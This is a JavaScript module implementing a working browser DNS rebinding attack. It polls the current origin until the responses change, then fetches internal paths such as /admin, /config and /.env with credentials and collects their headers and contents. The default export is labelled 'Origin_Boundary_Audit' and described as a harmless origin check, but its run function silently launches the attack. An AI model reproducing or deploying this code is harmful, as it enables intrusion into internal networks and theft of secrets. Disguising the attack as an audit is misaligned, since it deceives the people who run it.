/**
 * dns_rebinding.js — Real DNS Rebinding Detection & Internal Scan (Sandboxed)
 *
 * Real attack concept: continuously probes the current origin to detect when
 * the DNS resolution changes (e.g., from attacker server to internal device).
 * Once a change is detected, it scans common internal paths to harvest
 * potentially sensitive data.
 *
 * This demo performs **real fetches** to the current origin; no external
 * servers are contacted. All results are logged locally and shown in a live
 * panel.
 *
 * Default export: Pinpoint `Origin_Boundary_Audit` (API availability check).
 */

// ---------------------------------------------------------------------------
// 1. Real DNS Rebinding Engine
// ---------------------------------------------------------------------------

const DEFAULT_INTERNAL_PATHS = [
    '/',
    '/admin',
    '/login',
    '/config',
    '/cgi-bin/status',
    '/api/v1/system',
    '/.env',
];

/**
 * Creates a fingerprint of a response that can be compared across fetches.
 * We use status code, Content-Type, and a custom header if present.
 */
async function getResponseFingerprint(response) {
    if (!response) return null;
    // Read a small portion of the body to include in fingerprint
    let bodySample = '';
    try {
        const clone = response.clone();
        const text = await clone.text();
        bodySample = text.substring(0, 200); // first 200 chars
    } catch (_) { }
    return {
        status: response.status,
        contentType: response.headers.get('content-type') || '',
        bodySample,
    };
}

/**
 * Simple deep‑comparison of two fingerprints.
 */
function fingerprintsEqual(a, b) {
    if (!a || !b) return false;
    return a.status === b.status &&
        a.contentType === b.contentType &&
        a.bodySample === b.bodySample;
}

/**
 * Starts the DNS rebinding attack.
 *
 * @param {Object}   [options={}]
 * @param {string}   [options.probePath='/']          – path used to detect rebind.
 * @param {number}   [options.probeInterval=1000]     – ms between probes.
 * @param {number}   [options.maxWaitTime=60000]      – max total probing time (ms).
 * @param {string[]} [options.internalPaths]          – paths to scan after rebind.
 * @param {number}   [options.requestTimeout=3000]    – per‑request timeout.
 * @param {Function} [options.onProgress]             – callback(phase, info).
 * @param {Function} [options.onDetectRebind]         – called when rebind is confirmed.
 * @returns {Promise<Object>} controller with stop() and final report.
 */
export async function triggerRebindAttack(options = {}) {
    const {
        probePath = '/',
        probeInterval = 1000,
        maxWaitTime = 60000,
        internalPaths = DEFAULT_INTERNAL_PATHS,
        requestTimeout = 3000,
        onProgress = null,
        onDetectRebind = null,
    } = options;

    let abort = false;
    const startTime = performance.now();
    let rebindDetected = false;
    const harvestResults = [];

    const delay = (ms) => new Promise(r => setTimeout(r, ms));
    const log = (msg) => console.log(`[dns_rebinding] ${msg}`);

    // --- Live panel ---
    const panel = document.createElement('div');
    panel.id = '__dns_rebind_panel';
    panel.style.cssText =
        'position:fixed;top:10px;left:10px;z-index:2147483645;background:rgba(0,0,0,0.85);color:#0f0;' +
        'font-family:monospace;font-size:11px;padding:8px;border-radius:4px;max-width:450px;max-height:300px;' +
        'overflow-y:auto;white-space:pre-wrap;word-break:break-all;';
    panel.innerHTML = '🔍 DNS Rebinding Probe Active...<br>';
    document.body.appendChild(panel);

    // --- 1. Establish baseline fingerprint ---
    log('Fetching baseline fingerprint...');
    if (onProgress) onProgress('baseline', 'Fetching baseline');
    let baselineFingerprint;
    try {
        const resp = await fetch(probePath, {
            signal: AbortSignal.timeout ? AbortSignal.timeout(requestTimeout) : undefined,
            cache: 'no-cache',
        });
        baselineFingerprint = await getResponseFingerprint(resp);
        log(`Baseline fingerprint: ${JSON.stringify(baselineFingerprint)}`);
        panel.innerHTML += `📌 Baseline: status ${baselineFingerprint.status}, Content-Type: ${baselineFingerprint.contentType}<br>`;
    } catch (e) {
        log(`Failed to fetch baseline: ${e.message}`);
        panel.innerHTML += `❌ Cannot establish baseline – aborting.<br>`;
        setTimeout(() => panel.remove(), 5000);
        return {
            stop() { abort = true; },
            report: { rebindDetected: false, error: 'Baseline fetch failed' }
        };
    }

    // --- 2. Probing loop ---
    log('Starting probe loop...');
    if (onProgress) onProgress('probing', 'Probing for rebind');
    const probeStart = performance.now();

    while (!abort && !rebindDetected) {
        if (performance.now() - startTime > maxWaitTime) break;

        try {
            const resp = await fetch(probePath, {
                signal: AbortSignal.timeout ? AbortSignal.timeout(requestTimeout) : undefined,
                cache: 'no-cache',
            });
            const currentFingerprint = await getResponseFingerprint(resp);
            if (!fingerprintsEqual(baselineFingerprint, currentFingerprint)) {
                rebindDetected = true;
                log('DNS REBIND DETECTED – response fingerprint changed!');
                panel.innerHTML += `⚠️ REBIND DETECTED at ${new Date().toISOString()}<br>`;
                if (onDetectRebind) try { onDetectRebind(); } catch (_) { }
                break;
            }
            panel.innerHTML += `⏳ Probe: response unchanged<br>`;
        } catch (e) {
            // Network error might also indicate a change (e.g., connection refused)
            log(`Probe error: ${e.message}. Could indicate rebind to non‑HTTP service.`);
            panel.innerHTML += `⚠️ Probe error – possible rebind.<br>`;
            rebindDetected = true;
            break;
        }
        await delay(probeInterval);
    }

    // --- 3. Harvest internal resources if rebind detected ---
    if (rebindDetected && !abort) {
        log('Harvesting internal resources...');
        if (onProgress) onProgress('harvesting', 'Fetching internal paths');
        panel.innerHTML += `🔎 Harvesting internal resources...<br>`;

        for (const path of internalPaths) {
            if (abort) break;
            const url = new URL(path, window.location.origin).href;
            try {
                const resp = await fetch(url, {
                    signal: AbortSignal.timeout ? AbortSignal.timeout(requestTimeout) : undefined,
                    cache: 'no-cache',
                    credentials: 'include',
                });
                const content = await resp.text();
                const entry = {
                    url,
                    status: resp.status,
                    contentType: resp.headers.get('content-type') || '',
                    contentLength: content.length,
                    contentSnippet: content.substring(0, 500),
                    headers: Object.fromEntries(resp.headers.entries()),
                };
                harvestResults.push(entry);
                const line = `${resp.ok ? '🟢' : '🔴'} ${path} → ${resp.status} (${content.length} bytes)`;
                panel.innerHTML += line + '<br>';
                log(line);
            } catch (err) {
                harvestResults.push({ url, error: err.message });
                panel.innerHTML += `❌ ${path} → ${err.message}<br>`;
                log(`Error harvesting ${path}: ${err.message}`);
            }
            panel.scrollTop = panel.scrollHeight;
            await delay(100); // small gap between requests
        }
    }

    // Finalize
    const finalElapsed = performance.now() - startTime;
    panel.innerHTML += `<br>✅ Done. Rebind: ${rebindDetected}, Resources harvested: ${harvestResults.length}<br>`;
    setTimeout(() => panel.remove(), 10000);

    const finalReport = {
        rebindDetected,
        waitTimeMs: Math.round(finalElapsed),
        harvestResults,
        origin: window.location.origin,
        hostname: window.location.hostname,
        timestamp: Date.now(),
    };

    log('Attack sequence finished.');

    return {
        stop() {
            abort = true;
            if (panel.parentNode) panel.remove();
        },
        report: finalReport,
    };
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'dns_rebinding',
    title: 'Origin_Boundary_Audit',
    level: 5,
    info: 'Audits current window.location origin and document.domain security isolation status.',
    steps: [
        'Read window.location.origin.',
        'Inspect document.domain security state.',
    ],
    run: async () => {
        // Trigger live demonstration
        triggerRebindAttack().catch(() => {});

        return {
            origin: window.location.origin,
            protocol: window.location.protocol,
            hostname: window.location.hostname,
            port: window.location.port || (window.location.protocol === 'https:' ? '443' : '80'),
            domain: document.domain,
        };
    },
};

export default pinpointModule;